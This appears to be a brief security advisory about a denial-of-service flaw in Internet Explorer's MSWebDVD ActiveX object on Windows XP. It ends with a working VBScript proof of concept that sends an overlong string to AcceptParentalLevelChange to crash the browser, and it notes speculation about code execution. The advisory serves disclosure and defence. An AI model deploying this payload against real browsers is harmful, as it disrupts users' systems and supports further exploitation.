It has been reported that Internet Explorer may be prone to a denial of service vulnerability that may allow remote attackers to cause the browser to crash. The issue exists in the 'MSWebDVD' Object. An attacker may cause a denial of service condition in an instance of Internet Explorer by evoking the method through a malicious site and sending an excessive string value (about 255 characters) in the following manner:

object.AcceptParentalLevelChange (boolean value),UserName as string,Password
as string

Internet Explorer running in Windows XP has been reported to be affected by this issue, however, it is possible that other versions are affected as well.

Due to the nature of this issue, it has been conjectured that this vulnerability may be leveraged to execute arbitrary code. This has not been confirmed at the moment.


<script language=vbscript>
'On Error Resume Next
dim mymy2,a

a="AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
Set mymy2= CreateObject("MSWebDVD.MSWebDVD.1")
mymy2.AcceptParentalLevelChange False, "xc", a
